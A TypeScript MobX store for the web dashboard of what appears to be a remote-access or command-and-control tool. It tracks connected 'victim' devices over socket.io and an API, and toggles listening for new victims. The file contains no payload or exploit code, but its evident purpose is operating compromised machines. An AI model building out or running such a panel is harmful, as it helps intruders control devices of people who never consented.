import axios from 'axios';
import { action, makeObservable, observable } from 'mobx';
import { io, type Socket } from 'socket.io-client';

import { SOCKET_NAMESPACE_WEB } from '../../common/constants';
import {
    ConnectionStatus,
    ServerToWebEvents,
    WebToServerEvents,
} from '../../common/enums';
import {
    type IArrayResponse,
    type IBaseEntity,
    type IServerToWebEvents,
    type IVictim,
    type IWebToServerEvents,
} from '../../common/interfaces';
import { VictimDeviceStore } from './VictimDeviceStore';

export class SocketStore {
    public readonly socket: Socket<IServerToWebEvents, IWebToServerEvents>;

    public connectionStatus: ConnectionStatus = ConnectionStatus.DISCONNECTED;
    public listening: boolean = false;
    public victims: VictimDeviceStore[] = [];
    public inprogress: boolean = false;
    public loading: boolean = false;

    constructor() {
        this.socket = io(SOCKET_NAMESPACE_WEB, {
            autoConnect: false,
            forceNew: true,
        });

        this.setupListeners().catch((error) => {
            console.error('Failed to setup socket listeners!', error);
        });

        makeObservable(this, {
            connectionStatus: observable,
            listening: observable,
            loading: observable,
            victims: observable,
            inprogress: observable,
            setConnectionStatus: action,
            setInprogress: action,
            setLoading: action,
            setListening: action,
            setVictims: action,
        });
    }

    private async setupListeners(): Promise<void> {
        this.socket.on('connect', () => {
            this.setConnectionStatus(ConnectionStatus.CONNECTED);
            console.log('Connected to socket server!');
        });

        this.socket.on('disconnect', (reason, description) => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log('Disconnected from socket server!', {
                reason,
                description,
            });
        });

        this.socket.io.on('close', (reason, description) => {
            this.setConnectionStatus(ConnectionStatus.DISCONNECTED);
            console.log('Socket server closed!', { reason, description });
        });

        this.socket.io.on('error', (error) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Socket error!', error);
        });

        this.socket.io.on('reconnect', (attempt) => {
            this.connectionStatus = ConnectionStatus.CONNECTED;
            console.log('Reconnected to socket server!', attempt);
        });

        this.socket.io.on('reconnect_attempt', (attempt) => {
            this.connectionStatus = ConnectionStatus.CONNECTING;
            console.log('Attempting to reconnect to socket server!', attempt);
        });

        this.socket.io.on('reconnect_error', (err) => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Error reconnecting to socket server!', err);
        });

        this.socket.io.on('reconnect_failed', () => {
            this.setConnectionStatus(ConnectionStatus.ERROR);
            console.error('Failed to reconnect to socket server!');
        });

        this.socket.on(
            ServerToWebEvents.VICTIM_LISTENING_STATUS,
            (listening) => {
                this.setInprogress(false);
                this.setListening(listening);

                if (listening) {
                    setTimeout(() => {
                        this.fetchConnectedVictims().catch((error) => {
                            console.error(
                                'Failed to fetch connected victims!',
                                error,
                            );
                        });
                    }, 1000);
                }
            },
        );

        this.socket.on(ServerToWebEvents.VICTIM_CONNECTED, (victim) => {
            console.log('New victim connected!', victim);
            this.setVictims([...this.victims, new VictimDeviceStore(victim)]);
        });

        this.socket.on(ServerToWebEvents.VICTIM_DISCONNECTED, (victim) => {
            console.log('Victim disconnected!', victim);
            this.setVictims(
                this.victims.filter((v) => v.deviceId !== victim.deviceId),
            );
        });
    }

    public setConnectionStatus(connectionStatus: ConnectionStatus): void {
        this.connectionStatus = connectionStatus;
    }

    public setInprogress(inprogress: boolean): void {
        this.inprogress = inprogress;
    }

    public setLoading(loading: boolean): void {
        this.loading = loading;
    }

    public setListening(listening: boolean): void {
        this.listening = listening;
    }

    public setVictims(victims: VictimDeviceStore[]): void {
        this.victims = victims;
    }

    public async fetchConnectedVictims(): Promise<void> {
        this.setLoading(true);
        try {
            const response = await axios.get<
                IArrayResponse<IBaseEntity & IVictim>
            >('/api/victims/connected');

            if (typeof response.data === 'object' && response.data !== null) {
                this.setVictims(
                    response.data.data.map(
                        (victim) => new VictimDeviceStore(victim),
                    ),
                );
            }
        } catch (error) {
            console.error('Failed to fetch connected victims!', error);
        } finally {
            this.setLoading(false);
        }
    }

    public startListening(): void {
        this.setInprogress(true);
        this.socket.emit(WebToServerEvents.LISTEN_FOR_VICTIMS);
    }

    public stopListening(): void {
        this.setInprogress(true);
        this.socket.emit(WebToServerEvents.STOP_LISTENING_FOR_VICTIMS);
    }

    public connect(): void {
        this.socket.connect();
    }

    public disconnect(): void {
        this.socket.disconnect();
    }
}
